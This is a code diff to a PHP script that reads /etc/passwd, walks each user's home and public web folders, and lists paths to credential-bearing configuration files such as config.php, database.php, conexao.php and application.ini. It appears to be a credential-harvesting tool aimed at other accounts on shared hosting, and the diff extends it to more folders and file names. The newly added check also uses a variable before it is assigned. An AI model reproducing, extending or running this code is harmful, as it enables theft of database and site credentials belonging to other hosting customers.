@@ -203,10 +203,16 @@ $users = file('/etc/passwd');
 
 
     $public_folders[]="www";
-    //$public_folders[]="public_html";
+    $public_folders[]="public_html";
+
+
 
     foreach($homes as $keyHome=>$home) {
         foreach($users as $key=> $user) {
+            if ((is_dir('/' . $home . '/' . $userfinal[0] . '/' . $public_folders[0] . '/'))&&
+                (is_dir('/' . $home . '/' . $userfinal[0] . '/' . $public_folders[1] . '/')) ){
+                unset($public_folders[1]);
+            }
             foreach($public_folders as $public_folder) {
 
                 $userfinal = explode(':', $user);
@@ -269,12 +275,14 @@ $users = file('/etc/passwd');
                             $folderDefaults[] = "includes/";
                             $folderDefaults[] = "include/";
                             $folderDefaults[] = "config/";
+                            $folderDefaults[] = "configs/";
                             $folderDefaults[] = "common/";
                             $folderDefaults[] = "site/";
                             foreach ($folderDefaults as $keyFolder => $folderDefault) {
                                 if ($keyFolder != 0) {
                                     $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'configuration.php';
                                 }
+                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'application.ini';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'config.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'database.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conexao.php';
